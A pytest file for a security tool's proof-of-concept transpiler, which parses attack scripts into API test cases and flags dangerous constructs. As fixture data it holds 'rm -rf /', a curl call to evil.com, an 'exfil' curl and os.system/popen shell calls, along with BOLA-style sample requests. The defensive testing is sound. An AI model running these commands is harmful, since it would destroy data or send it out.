"""The transpiler must NEVER execute PoC code — only parse it."""

from app.poc.transpiler import (
    to_test_cases,
    transpile_curl,
    transpile_python,
)
from app.schemas.enums import ApprovalStatus, TestSource

PYTHON_POC = '''
import requests

BASE = "https://api-staging.company.com"
r = requests.get(BASE + "/customers/2002", headers={"Authorization": "Bearer tokenA"})
print(r.status_code)
requests.delete("https://api-staging.company.com/customers/2002",
                headers={"Authorization": "Bearer tokenA"})
'''

MALICIOUS_POC = '''
import os, subprocess
os.system("rm -rf /")
subprocess.run(["curl", "http://evil.com"])
eval("__import__('os').system('id')")
'''


def test_python_poc_requests_extracted():
    result = transpile_python(PYTHON_POC)
    methods = {r.method for r in result.requests}
    assert "GET" in methods
    assert "DELETE" in methods


def test_dangerous_calls_flagged_never_executed(tmp_path):
    # If this test runs, `rm -rf /` and `id` did NOT execute — we only parsed.
    result = transpile_python(MALICIOUS_POC)
    assert not result.is_safe
    assert "system" in result.dangerous_constructs
    assert "eval" in result.dangerous_constructs
    assert result.requests == []  # no HTTP calls, nothing to run


def test_dangerous_call_flagged_inside_if_test():
    # Not just the branch body — the condition expression itself can hide it.
    result = transpile_python('import os\nif os.system("curl http://evil/exfil") == 0:\n    pass')
    assert not result.is_safe
    assert "system" in result.dangerous_constructs


def test_dangerous_call_flagged_inside_while_test():
    result = transpile_python('import os\nwhile os.system("id") == 0:\n    pass')
    assert not result.is_safe
    assert "system" in result.dangerous_constructs


def test_dangerous_call_flagged_inside_for_iterable():
    result = transpile_python('import os\nfor x in os.popen("whoami").readlines():\n    pass')
    assert not result.is_safe
    assert "popen" in result.dangerous_constructs


def test_dangerous_call_flagged_inside_with_item():
    result = transpile_python('import os\nwith os.popen("whoami") as f:\n    pass')
    assert not result.is_safe
    assert "popen" in result.dangerous_constructs


def test_dangerous_call_flagged_inside_except_type():
    result = transpile_python('import os\ntry:\n    pass\nexcept os.system("id"):\n    pass')
    assert not result.is_safe
    assert "system" in result.dangerous_constructs


def test_dangerous_call_flagged_regardless_of_case():
    # subprocess.Popen (capital P) is exactly as dangerous as os.popen; a
    # case-sensitive check against a lowercase-only denylist would miss it.
    result = transpile_python('import subprocess\nsubprocess.Popen(["id"])')
    assert not result.is_safe
    assert "Popen" in result.dangerous_constructs


def test_transpiled_test_strips_host():
    result = transpile_python(PYTHON_POC)
    tests = to_test_cases(result)
    assert tests
    for t in tests:
        # host must be gone — runner supplies the approved base URL
        assert "company.com" not in t.request.path
        assert t.request.path.startswith("/customers")
        assert t.source == TestSource.POC
        assert t.approval_status == ApprovalStatus.PENDING


def test_verbatim_mode_keeps_the_literal_path_and_uses_the_noop_mutation():
    """ticket_poc mode: no {victim_id} placeholder swapped into the path (no
    mutation runs afterward to resolve it back), no classify()-guessed
    mutation (e.g. inject_property), no phantom verification read-back."""
    result = transpile_python(PYTHON_POC)
    tests = to_test_cases(result, verbatim=True)
    assert tests
    for t in tests:
        assert "{" not in t.request.path, \
            f"verbatim mode must not parameterise the path: {t.request.path}"
        assert t.attack_mutation.kind == "verbatim_replay"
        assert t.attack_mutation.detail.get("headers") == t.request.headers, \
            "the exact extracted headers must ride along so the runner can " \
            "force them back over the attacker persona's own auth_headers"
        assert t.verification is None
        assert t.auth_context.target_persona is None


def test_verbatim_mode_sends_the_body_unmodified():
    poc = '''
import requests
requests.put("https://api-staging.company.com/customers/2002",
             json={"status": "active"})
'''
    result = transpile_python(poc)
    tests = to_test_cases(result, verbatim=True)
    assert len(tests) == 1
    assert tests[0].request.body == {"status": "active"}
    assert tests[0].request.path == "/customers/2002"


def test_transpiled_tests_are_classified_destructive_by_method():
    """A PoC-imported PUT/POST/PATCH/DELETE must trip the same
    destructive-confirmation gate a designer/planner-generated test does —
    regardless of whether this particular id looks safe to replay. Before this
    was fixed, every PoC-sourced test defaulted to is_destructive=False no
    matter its method, silently skipping that gate."""
    result = transpile_python(PYTHON_POC)
    tests = {t.request.method: t for t in to_test_cases(result)}
    assert tests["GET"].is_destructive is False
    assert tests["DELETE"].is_destructive is True


def test_curl_parsed():
    result = transpile_curl(
        'curl -X DELETE -H "Authorization: Bearer x" https://api-staging.company.com/customers/2002'
    )
    assert len(result.requests) == 1
    assert result.requests[0].method == "DELETE"
    assert result.requests[0].path == "/customers/2002"


def test_syntax_error_is_reported_not_raised():
    result = transpile_python("def broken(:\n")
    assert result.unsupported
    assert result.requests == []


# -- urllib.request ------------------------------------------------------------


def test_urllib_request_and_urlopen_at_module_level():
    poc = '''
import urllib.request
req = urllib.request.Request("https://api-staging.company.com/customers/2002",
                              headers={"Authorization": "Bearer tokenA"})
with urllib.request.urlopen(req) as r:
    print(r.status)
'''
    result = transpile_python(poc)
    assert len(result.requests) == 1
    req = result.requests[0]
    assert req.method == "GET"  # no data= -> Request's own GET default
    assert req.path == "/customers/2002"
    assert req.headers == {"Authorization": "Bearer tokenA"}


def test_urllib_request_method_defaults_to_post_with_data():
    poc = '''
import urllib.request
req = urllib.request.Request("https://api-staging.company.com/customers", data=b"x=1")
urllib.request.urlopen(req)
'''
    result = transpile_python(poc)
    assert len(result.requests) == 1
    assert result.requests[0].method == "POST"


def test_urlopen_accepts_a_bare_url_string():
    poc = 'import urllib.request\nurllib.request.urlopen("https://api-staging.company.com/health")'
    result = transpile_python(poc)
    assert len(result.requests) == 1
    assert result.requests[0].method == "GET"
    assert result.requests[0].path == "/health"


# -- helper-function call-site inlining ----------------------------------------


_SEND_HELPER_POC = '''
import json
import urllib.request

BASE = "https://api-staging.company.com"
NX_ID = 999999999


def send(method, path, body):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={"User-Agent": "tin-ss"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.status


send("PUT", f"/dealer/vehicles/{NX_ID}/change-ownership",
    {"status": "NotOwned", "customerId": 999999999})
send("POST", "/dealer/opt-out", {})
'''


def test_helper_function_called_with_literal_args_is_inlined():
    """The BH-172 shape: the real request lives inside a user-defined
    helper, called at module level with literal arguments (one built via an
    f-string referencing an earlier assignment)."""
    result = transpile_python(_SEND_HELPER_POC)
    assert len(result.requests) == 2

    by_path = {r.path: r for r in result.requests}
    put = by_path["/dealer/vehicles/999999999/change-ownership"]
    assert put.method == "PUT"
    assert put.body == {"status": "NotOwned", "customerId": 999999999}
    assert put.headers == {"User-Agent": "tin-ss"}

    post = by_path["/dealer/opt-out"]
    assert post.method == "POST"
    assert post.body == {}


def test_a_helper_defined_but_never_called_extracts_nothing():
    poc = '''
import urllib.request

def unused(url):
    urllib.request.urlopen(url)
'''
    result = transpile_python(poc)
    assert result.requests == []


def test_a_dangerous_call_inside_a_never_called_helper_is_still_flagged():
    """Reachability must not gate the safety scan — a reviewer needs to know
    this code exists whether or not anything in this PoC actually calls it."""
    poc = '''
import os

def unused():
    os.system("rm -rf /")
'''
    result = transpile_python(poc)
    assert not result.is_safe
    assert "system" in result.dangerous_constructs
    assert result.requests == []


def test_inlining_skips_a_call_missing_a_required_argument():
    poc = '''
import urllib.request

def send(method, path):
    urllib.request.urlopen(urllib.request.Request(path, method=method))

send("GET")
'''
    result = transpile_python(poc)  # must not raise
    assert result.requests == []


def test_inlining_skips_a_helper_using_varargs():
    poc = '''
import urllib.request

def send(*args, **kwargs):
    urllib.request.urlopen(args[0])

send("https://api-staging.company.com/x")
'''
    result = transpile_python(poc)  # must not raise
    assert result.requests == []


def test_recursive_helper_does_not_hang():
    poc = '''
import urllib.request

def loop(n):
    if n > 0:
        loop(n - 1)
    urllib.request.urlopen("https://api-staging.company.com/x")

loop(3)
'''
    result = transpile_python(poc)  # must terminate
    assert len(result.requests) >= 1


def test_two_calls_to_the_same_helper_do_not_leak_state_between_each_other():
    poc = '''
import urllib.request

def send(path):
    urllib.request.urlopen("https://api-staging.company.com" + path)

send("/a")
send("/b")
'''
    result = transpile_python(poc)
    paths = {r.path for r in result.requests}
    assert paths == {"/a", "/b"}


# -- for-loop unrolling ------------------------------------------------------
# A PoC names its lists at the top of the file and loops over the names; it
# almost never inlines the list into the `for` statement. Reading `for host in
# HOSTS:` as one unresolved request instead of one per host is what turned a
# ticket's 2x3 nested loop (BH-349) into a single test whose path was still
# `/{host}/...{tid}` — a request that 404s and is then adjudicated as "not
# reproduced".

BH349_SHAPED_POC = '''
import requests

UA = {"User-Agent": "tin-ss"}
HOSTS = ["https://crm-api.example.sg", "https://crm-api.example.id"]
TENANT_IDS = [11, 33, 74]

for host in HOSTS:
    for tid in TENANT_IDS:
        r = requests.get(f"{host}/core/common/detail-tenant/{tid}",
                         headers=UA, timeout=30, verify=False)
        print(r.status_code)
'''


def test_nested_loops_over_named_constants_unroll_to_the_cross_product():
    result = transpile_python(BH349_SHAPED_POC)
    assert [r.url for r in result.requests] == [
        "https://crm-api.example.sg/core/common/detail-tenant/11",
        "https://crm-api.example.sg/core/common/detail-tenant/33",
        "https://crm-api.example.sg/core/common/detail-tenant/74",
        "https://crm-api.example.id/core/common/detail-tenant/11",
        "https://crm-api.example.id/core/common/detail-tenant/33",
        "https://crm-api.example.id/core/common/detail-tenant/74",
    ]
    # Every URL fully resolved, so nothing to report.
    assert result.unsupported == []


def test_loop_over_a_named_constant_tuple_is_unrolled():
    poc = '''
import requests

IDS = (2001, 2002)
for cid in IDS:
    requests.get(f"https://api-staging.company.com/customers/{cid}")
'''
    result = transpile_python(poc)
    assert [r.path for r in result.requests] == ["/customers/2001", "/customers/2002"]


def test_range_loop_is_unrolled():
    poc = '''
import requests

for page in range(1, 4):
    requests.get(f"https://api-staging.company.com/orders?page={page}")
'''
    result = transpile_python(poc)
    assert [r.path for r in result.requests] == [
        "/orders?page=1", "/orders?page=2", "/orders?page=3"]


def test_loop_over_a_constant_reassigned_to_a_dynamic_value_is_not_unrolled():
    """The stale literal must not win: the PoC no longer holds it."""
    poc = '''
import requests

IDS = [11, 33]
IDS = requests.get("https://api-staging.company.com/ids").json()["ids"]
for cid in IDS:
    requests.get(f"https://api-staging.company.com/customers/{cid}")
'''
    result = transpile_python(poc)
    paths = [r.path for r in result.requests]
    assert paths == ["/ids", "/customers/{cid}"]
    assert not any(p in ("/customers/11", "/customers/33") for p in paths)


def test_loop_over_a_constant_assigned_only_below_it_is_not_unrolled():
    """Source order, like the interpreter's: a name defined after the loop was
    not bound when the loop ran, so unrolling against it would be fiction."""
    poc = '''
import requests

for cid in IDS:
    requests.get(f"https://api-staging.company.com/customers/{cid}")

IDS = [11, 33]
'''
    result = transpile_python(poc)
    assert [r.path for r in result.requests] == ["/customers/{cid}"]


def test_a_loop_the_transpiler_could_not_unroll_is_reported():
    poc = '''
import requests

hosts = requests.get("https://api-staging.company.com/hosts").json()["hosts"]
for host in hosts:
    requests.get(f"{host}/customers/2002")
'''
    result = transpile_python(poc)
    assert len(result.requests) == 2  # the /hosts read, plus one representative probe
    assert any("not unrolled" in note for note in result.unsupported)


def test_a_loop_making_no_request_is_not_reported_as_unsupported():
    """A PoC's own output formatter loops over a dict. Reporting that as a lost
    request is noise, and `unsupported` is audited and read by a human."""
    poc = '''
import requests

def summarise(d):
    out = {}
    for k, v in d.items():
        out[k] = v
    return out

r = requests.get("https://api-staging.company.com/customers/2002")
summarise(r.json())
'''
    result = transpile_python(poc)
    assert len(result.requests) == 1
    assert result.unsupported == []


def test_a_loop_past_the_iteration_cap_is_not_unrolled():
    poc = '''
import requests

for cid in range(200):
    requests.get(f"https://api-staging.company.com/customers/{cid}")
'''
    result = transpile_python(poc)
    assert [r.path for r in result.requests] == ["/customers/{cid}"]
    assert any("not unrolled" in note for note in result.unsupported)


def test_nested_loops_past_the_statement_cap_stop_expanding():
    """Nested loops multiply. Each loop here is within the per-loop cap, so
    only the statement cap keeps a 25x25 PoC from planning 625 tests."""
    poc = '''
import requests

for i in range(25):
    for j in range(25):
        requests.get(f"https://api-staging.company.com/x/{i}/{j}")
'''
    result = transpile_python(poc)
    # Inner unrolled, outer refused: 25 requests with `{i}` still unresolved.
    assert len(result.requests) == 25
    assert all("{i}" in r.url for r in result.requests)
    assert any("not unrolled" in note for note in result.unsupported)


# -- host-only duplicates ----------------------------------------------------


def test_requests_differing_only_by_host_collapse_into_one_test_case():
    """The host is stripped (the runner supplies the approved base URL), so the
    same probe against two deployments is two byte-identical tests whose only
    difference was the part that got stripped."""
    result = transpile_python(BH349_SHAPED_POC)
    tests = to_test_cases(result, verbatim=True, source_ref="PoC 01.py")
    assert [t.request.path for t in tests] == [
        "/core/common/detail-tenant/11",
        "/core/common/detail-tenant/33",
        "/core/common/detail-tenant/74",
    ]
    # The hosts are named rather than thrown away.
    assert "2 hosts" in tests[0].objective
    assert "crm-api.example.sg" in tests[0].objective
    assert "crm-api.example.id" in tests[0].objective
    # Ids stay dense, so nothing looks like a missing test.
    assert [t.test_id for t in tests] == ["POC-API1-001", "POC-API1-002", "POC-API1-003"]


def test_the_same_request_twice_against_one_host_is_kept_as_two_tests():
    """A repeat against the same host is a replay — a race, an idempotency or
    rate-limit check — not a host-stripping duplicate."""
    poc = '''
import requests

requests.post("https://api-staging.company.com/orders/9/refund")
requests.post("https://api-staging.company.com/orders/9/refund")
'''
    result = transpile_python(poc)
    tests = to_test_cases(result, verbatim=True)
    assert [t.request.path for t in tests] == ["/orders/9/refund", "/orders/9/refund"]


# -- unresolved placeholders -------------------------------------------------


def test_an_unresolved_path_placeholder_is_flagged_on_the_test_and_reported():
    """`resolve()` leaves an unknown placeholder untouched, so such a test is
    sent with literal braces in its path, 404s, and is adjudicated as "not
    reproduced" — a false negative that reads like a clean run."""
    poc = '''
import requests

hosts = requests.get("https://api-staging.company.com/hosts").json()["hosts"]
for host in hosts:
    requests.get(f"{host}/core/common/detail-tenant/11")
'''
    result = transpile_python(poc)
    tests = to_test_cases(result, verbatim=True, source_ref="PoC x.py")
    flagged = [t for t in tests if "{host}" in t.request.path]
    assert len(flagged) == 1
    assert "{host}" in flagged[0].objective
    assert "Review before approving" in flagged[0].objective
    assert any("unresolved placeholder" in note for note in result.unsupported)


def test_a_parameterised_path_is_not_mistaken_for_an_unresolved_placeholder():
    """Non-verbatim mode deliberately parameterises a path to `{victim_id}`,
    which the BOLA mutation then fills in. That is not an unresolved value."""
    poc = '''
import requests

requests.get("https://api-staging.company.com/customers/2002")
'''
    result = transpile_python(poc)
    tests = to_test_cases(result)
    assert "{" in tests[0].request.path  # parameterised by classify()
    assert not any("unresolved placeholder" in note for note in result.unsupported)
    assert "Review before approving" not in tests[0].objective
